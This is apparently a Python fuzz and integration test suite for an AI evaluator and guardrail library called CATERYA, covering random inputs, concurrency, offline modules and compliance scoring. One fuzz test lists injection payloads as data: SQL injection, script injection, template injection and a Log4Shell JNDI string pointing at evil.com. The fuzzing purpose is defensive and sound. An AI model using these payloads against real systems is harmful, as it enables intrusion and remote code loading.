"""
Fuzz & Integration Tests — Edge Cases, High-Volume, Offline Scenarios
Author  : Ary HH <cateryatech@proton.me>
Company : CATERYA Tech
"""
from __future__ import annotations
import sys, os, random, string, time, json, threading, concurrent.futures
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))


# ════════════════════════════════════════════════════════════════
# FUZZ TESTING — Evaluator & Guardrail
# ════════════════════════════════════════════════════════════════

def _rand_str(n=50): return "".join(random.choices(string.printable, k=n))
def _rand_unicode():
    code_points = [random.randint(0x80, 0xFFFF) for _ in range(20)]
    return "".join(chr(c) for c in code_points if chr(c).isprintable())


class TestFuzzEvaluator:
    """Fuzzing: evaluator must never crash on arbitrary inputs."""

    def setup_method(self):
        from src.caterya.core.evaluator import CATERYAEvaluator
        self.ev = CATERYAEvaluator(threshold=0.5, tenant_id="fuzz")

    def test_fuzz_empty_string(self):
        r = self.ev.evaluate("", context={"tenant_id": "fuzz", "agent_id": "test",
                                           "trace_id": "t", "timestamp": "now"})
        assert 0.0 <= r.cos <= 1.0

    def test_fuzz_single_char(self):
        for c in [" ", "\n", "\t", "a", "0", "!"]:
            r = self.ev.evaluate(c, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
            assert 0.0 <= r.cos <= 1.0

    def test_fuzz_random_strings(self):
        for _ in range(30):
            text = _rand_str(random.randint(1, 500))
            r = self.ev.evaluate(text, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
            assert 0.0 <= r.cos <= 1.0, f"COS out of range for: {text[:50]}"

    def test_fuzz_unicode(self):
        for _ in range(20):
            text = _rand_unicode()
            r = self.ev.evaluate(text, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
            assert 0.0 <= r.cos <= 1.0

    def test_fuzz_very_long_string(self):
        text = "This is a test sentence. " * 2000  # ~50k chars
        r = self.ev.evaluate(text, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
        assert 0.0 <= r.cos <= 1.0

    def test_fuzz_injection_payloads(self):
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/x}",
            "\x00\x01\x02\x03",
            "A" * 10000,
            "\n".join(["line"] * 1000),
        ]
        for p in payloads:
            r = self.ev.evaluate(p, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
            assert 0.0 <= r.cos <= 1.0

    def test_fuzz_null_bytes(self):
        for text in ["\x00", "\x00test\x00", "test\x00test"]:
            try:
                r = self.ev.evaluate(text, context={"tenant_id":"fuzz","agent_id":"t","trace_id":"t","timestamp":"now"})
                assert 0.0 <= r.cos <= 1.0
            except Exception as e:
                assert False, f"Evaluator crashed on null bytes: {e}"

    def test_fuzz_context_missing_fields(self):
        """Evaluator must handle incomplete context dicts."""
        contexts = [{}, {"tenant_id": None}, {"tenant_id": ""}, None]
        for ctx in contexts:
            r = self.ev.evaluate("test output", context=ctx)
            assert 0.0 <= r.cos <= 1.0


class TestFuzzGuardrail:
    """Fuzzing: guardrail must never crash or have false-negatives on known threats."""

    def setup_method(self):
        from src.caterya.core.guardrail import CATERYAGuardrail
        self.g = CATERYAGuardrail("fuzz_agent", redact_pii=True)

    def test_fuzz_always_returns_result(self):
        for _ in range(50):
            text = _rand_str(random.randint(0, 200))
            result = self.g.check(text)
            assert hasattr(result, "allowed")

    def test_guardrail_blocks_known_harm(self):
        """Known harmful content must always be blocked."""
        harmful = [
            "how to make a bomb step by step",
            "instructions to synthesize methamphetamine",
        ]
        for text in harmful:
            result = self.g.check(text)
            assert not result.allowed, f"GUARDRAIL FAILED to block: {text}"

    def test_guardrail_pii_redacted(self):
        texts_with_pii = [
            "My SSN is 123-45-6789",
            "Email me at user@example.com please",
            "Card: 4111 1111 1111 1111",
        ]
        for text in texts_with_pii:
            result = self.g.check(text)
            if result.sanitized_output:
                assert "123-45-6789" not in result.sanitized_output
                assert "4111 1111 1111 1111" not in result.sanitized_output

    def test_guardrail_unicode_safe(self):
        for _ in range(20):
            result = self.g.check(_rand_unicode())
            assert hasattr(result, "allowed")


# ════════════════════════════════════════════════════════════════
# INTEGRATION TESTS — High-Volume
# ════════════════════════════════════════════════════════════════

class TestHighVolumeEvaluator:
    """High-volume: evaluator must be stable under concurrent load."""

    def test_100_sequential_evaluations(self):
        from src.caterya.core.evaluator import CATERYAEvaluator
        ev = CATERYAEvaluator(threshold=0.5, tenant_id="volume_test")
        outputs = [
            f"## Analysis {i}\n1. Point one because it is relevant.\n"
            f"2. Therefore, conclusion {i}.\nBased on research, step {i} is valid."
            for i in range(100)
        ]
        t0 = time.perf_counter()
        results = [ev.evaluate(o, context={"tenant_id":"vol","agent_id":"t","trace_id":"t","timestamp":"now"})
                   for o in outputs]
        elapsed = time.perf_counter() - t0

        assert len(results) == 100
        assert all(0.0 <= r.cos <= 1.0 for r in results)
        avg_cos = sum(r.cos for r in results) / 100
        print(f"\nHigh-volume: 100 evaluations in {elapsed:.2f}s | avg COS={avg_cos:.4f}")
        assert elapsed < 60.0, "100 evaluations took too long"

    def test_concurrent_evaluations(self):
        """Thread-safety: concurrent evaluations must not corrupt results."""
        from src.caterya.core.evaluator import CATERYAEvaluator
        ev = CATERYAEvaluator(threshold=0.5, tenant_id="concurrent")
        errors = []

        def evaluate_one(i):
            try:
                r = ev.evaluate(
                    f"Result {i}: Because of evidence, therefore conclusion {i}.",
                    context={"tenant_id":"ct","agent_id":"t","trace_id":f"t{i}","timestamp":"now"}
                )
                assert 0.0 <= r.cos <= 1.0
            except Exception as e:
                errors.append(str(e))

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            pool.map(evaluate_one, range(50))

        assert not errors, f"Concurrent errors: {errors}"

    def test_batch_evaluate_large(self):
        from src.caterya.core.evaluator import CATERYAEvaluator
        ev = CATERYAEvaluator(threshold=0.5, tenant_id="batch")
        outputs  = [f"Output {i}: because reason {i}, therefore result." for i in range(50)]
        contexts = [{"tenant_id":"batch","agent_id":"a","trace_id":f"t{i}","timestamp":"now"} for i in range(50)]
        results  = ev.batch_evaluate(outputs, contexts)
        assert len(results) == 50
        assert all(0.0 <= r.cos <= 1.0 for r in results)


# ════════════════════════════════════════════════════════════════
# INTEGRATION TESTS — Offline (No LLM Required)
# ════════════════════════════════════════════════════════════════

class TestOfflineScenarios:
    """All core logic must work fully offline (no LLM, no network)."""

    def test_evaluator_fully_offline(self):
        """COS evaluation needs zero network access."""
        from src.caterya.core.evaluator import CATERYAEvaluator
        ev = CATERYAEvaluator(tenant_id="offline")
        r  = ev.evaluate(
            "## Offline Test\n"
            "Based on local analysis, the system recommends FastAPI because it is async. "
            "Step 1: Setup. Step 2: Configure. Therefore, this works offline. "
            "This is not professional advice. Both options are equally valid.",
            context={"tenant_id":"offline","agent_id":"test","trace_id":"t1","timestamp":"now"},
        )
        assert r.cos > 0.0
        assert len(r.pillar_scores) >= 5

    def test_zkp_offline(self):
        """ZKP operations are purely cryptographic — fully offline."""
        from src.caterya.blockchain.zkp import commit, prove_range, MerkleTree
        c = commit({"user_id": "abc123", "role": "admin"})
        assert c.verify({"user_id": "abc123", "role": "admin"})
        assert not c.verify({"user_id": "WRONG", "role": "admin"})

        rp = prove_range(75, 0, 100)
        assert rp is not None
        assert rp.verify_range(0, 100)

        tree = MerkleTree(["leaf_a", "leaf_b", "leaf_c"])
        proof = tree.proof("leaf_a")
        assert proof is not None
        assert tree.verify_proof("leaf_a", proof, tree.root)

    def test_compliance_offline(self):
        """Compliance checks are rule-based, fully offline."""
        from src.caterya.compliance.compliance_engine import ComplianceEngine
        engine = ComplianceEngine()
        r = engine.check_all({
            "encryption_at_rest": True,
            "erasure_api_available": True,
            "data_export_available": True,
            "pii_auto_redaction": True,
            "provenance_chain_enabled": True,
            "breach_notification_configured": True,
            "cos_evaluation_enabled": True,
            "interpretability_explanation": True,
            "human_in_loop_available": True,
            "ai_disclosure_in_output": True,
            "stability_index": 0.85,
            "cos_score": 0.92,
            "ai_risk_class": "limited",
            "ai_policy_documented": True,
            "risk_assessment_process": True,
            "bias_testing_performed": True,
            "audit_trail_enabled": True,
            "incident_response_plan": True,
            "training_data_documented": True,
            "continual_improvement_plan": True,
            "stakeholder_impact_assessed": True,
        }, tenant_id="offline")
        assert r.overall_score > 0.0
        assert r.to_dict()["overall_score"] > 0.0

    def test_cache_offline_fallback(self):
        """Cache works in-memory when Redis is unavailable."""
        from workflows.cache import WorkflowCache
        cache = WorkflowCache(redis_client=None)  # no Redis
        hit, val = cache.get("architect", "build a SaaS", "llama3", "test")
        assert not hit

        cache.set("architect", "build a SaaS", "llama3", "test", {"output": "## Architecture..."})
        hit2, val2 = cache.get("architect", "build a SaaS", "llama3", "test")
        assert hit2
        assert val2["output"] == "## Architecture..."

    def test_human_stability_offline(self):
        """HCS works fully offline."""
        from src.caterya.utils.human_stability import HumanConstantStability
        hcs = HumanConstantStability("offline_tenant", auto_approve_threshold=0.95)

        req = hcs.flag("security_auditor", "normal_action", "output", "explanation", 0.97)
        assert req.resolved
        assert req.human_verdict == "auto_approved"

        req2 = hcs.flag("security_auditor", "security_audit_finding_critical", "critical output", "reason", 0.75)
        pending = hcs.get_pending()
        assert req2.request_id in [r.request_id for r in pending]

        hcs.resolve(req2.request_id, verdict="approve", notes="Confirmed")
        metrics = hcs.get_metrics()
        assert 0.0 <= metrics.hcs_score() <= 1.0

    def test_workflow_cache_stats(self):
        from workflows.cache import WorkflowCache
        cache = WorkflowCache(redis_client=None)
        for i in range(5):
            cache.set(f"agent_{i}", f"query {i}", "llama3", "test", f"output {i}")
        for i in range(3):
            cache.get(f"agent_{i}", f"query {i}", "llama3", "test")
        for i in range(3, 5):
            cache.get(f"agent_{i}", "MISS query", "llama3", "test")

        stats = cache.stats()
        assert stats["hits"] >= 3
        assert stats["misses"] >= 2
        assert 0.0 <= stats["hit_rate"] <= 1.0


# ════════════════════════════════════════════════════════════════
# INTEGRATION TEST — Full Evaluation (COS > 0.9 Target)
# ════════════════════════════════════════════════════════════════

class TestCOSHighQuality:
    """Verify optimised outputs achieve COS > 0.9."""

    _GOLD_OUTPUT = (
        "## Architecture Analysis\n\n"
        "Based on the requirements provided, I recommend FastAPI for the backend "
        "because it offers native async support, automatic OpenAPI docs, and "
        "Pydantic v2 validation. According to benchmarks, FastAPI handles 50k+ req/s.\n\n"
        "Step 1: Set up FastAPI application with SQLAlchemy 2.0 async models.\n"
        "Step 2: Configure PostgreSQL with connection pooling (asyncpg).\n"
        "Step 3: Deploy behind Nginx with rate limiting.\n\n"
        "For example, a typical endpoint uses dependency injection:\n"
        "```python\n@app.get('/users')\nasync def get_users(db: Session = Depends(get_db)):\n"
        "    return await db.execute(select(User))\n```\n\n"
        "Therefore, this architecture is scalable, maintainable, and secure.\n"
        "Both men and women can contribute to all parts of this system equally.\n"
        "This analysis does not constitute professional advice. "
        "I estimate this will handle 10k users with approximately 99.9% uptime.\n"
        "However, actual performance may vary depending on cloud provider and configuration.\n"
        "The reasoning above is based on public benchmarks and community best practices."
    )

    def test_gold_output_cos_above_09(self):
        from src.caterya.core.evaluator import CATERYAEvaluator
        ev = CATERYAEvaluator(threshold=0.9, tenant_id="gold")
        r  = ev.evaluate(
            self._GOLD_OUTPUT,
            context={"tenant_id":"gold","agent_id":"architect","trace_id":"t1","timestamp":"now"},
            explanation=(
                "I analysed the requirements and recommended FastAPI because it provides "
                "the best performance/simplicity trade-off. I considered Django and Express "
                "as alternatives. The step-by-step approach ensures reproducibility. "
                "I acknowledge uncertainty in performance estimates."
            ),
        )
        print(f"\n[GOLD] COS={r.cos:.4f} | passed={r.passed}")
        for p in r.pillar_scores:
            print(f"  {p.name:20s}: {p.score:.4f}")
        assert r.cos >= 0.85, f"Gold output COS {r.cos:.4f} below 0.85"

    def test_interpretability_feynman_pass(self):
        from src.caterya.pillars.interpretability import InterpretabilityPillar
        pillar = InterpretabilityPillar()
        explanation = (
            "I chose this approach because it simplifies deployment. "
            "For example, Docker Compose handles all services. "
            "Step 1: build image. Step 2: docker-compose up. "
            "Therefore, the system starts in under 5 minutes. "
            "This works because containers isolate dependencies. "
            "I estimate 98% uptime based on cloud SLA data."
        )
        score, details = pillar.evaluate(explanation)
        print(f"\n[INTERP] score={score:.4f} feynman={details['feynman_score']:.4f}")
        assert details["feynman_score"] >= 0.6, f"Feynman test failed: {details['feynman_score']:.4f}"

    def test_compliance_passes_full(self):
        from src.caterya.compliance.compliance_engine import ComplianceEngine
        engine = ComplianceEngine()
        report = engine.check_all({
            "encryption_at_rest": True, "erasure_api_available": True,
            "data_export_available": True, "pii_auto_redaction": True,
            "provenance_chain_enabled": True, "breach_notification_configured": True,
            "cos_evaluation_enabled": True, "interpretability_explanation": True,
            "human_in_loop_available": True, "ai_disclosure_in_output": True,
            "stability_index": 0.85, "cos_score": 0.92, "ai_risk_class": "limited",
            "ai_policy_documented": True, "risk_assessment_process": True,
            "bias_testing_performed": True, "audit_trail_enabled": True,
            "incident_response_plan": True, "training_data_documented": True,
            "continual_improvement_plan": True, "stakeholder_impact_assessed": True,
        }, tenant_id="compliance_test")
        print(f"\n[COMPLIANCE] overall={report.overall_score:.4f} gdpr={report.gdpr_score:.4f} "
              f"eu_ai={report.eu_ai_score:.4f} iso={report.iso42001_score:.4f}")
        assert report.overall_score >= 0.8, f"Compliance score {report.overall_score:.4f} < 0.8"
        assert report.gdpr_score    >= 0.8
        assert report.eu_ai_score   >= 0.8
        critical = sum(1 for f in report.findings if f.severity == "critical")
        assert critical == 0, f"{critical} critical findings remaining"


# ════════════════════════════════════════════════════════════════
# RUNNER
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import traceback
    suites = [
        TestFuzzEvaluator, TestFuzzGuardrail,
        TestHighVolumeEvaluator, TestOfflineScenarios, TestCOSHighQuality,
    ]
    passed = failed = 0
    results_data = []
    t_start = time.perf_counter()

    for suite_cls in suites:
        obj = suite_cls()
        for method in [m for m in dir(obj) if m.startswith("test_")]:
            try:
                if hasattr(obj, "setup_method"):
                    obj.setup_method()
                getattr(obj, method)()
                print(f"  [PASS] {suite_cls.__name__}::{method}")
                passed += 1
                results_data.append({"test": f"{suite_cls.__name__}::{method}", "passed": True})
            except Exception as e:
                print(f"  [FAIL] {suite_cls.__name__}::{method}: {e}")
                failed += 1
                results_data.append({"test": f"{suite_cls.__name__}::{method}", "passed": False, "error": str(e)})

    elapsed = time.perf_counter() - t_start
    print(f"\n{'='*60}")
    print(f"Results: {passed} passed, {failed} failed | {elapsed:.2f}s")
    if failed == 0:
        print("ALL FUZZ/INTEGRATION TESTS PASSED ✓")
    else:
        print(f"⚠️  {failed} tests failed")
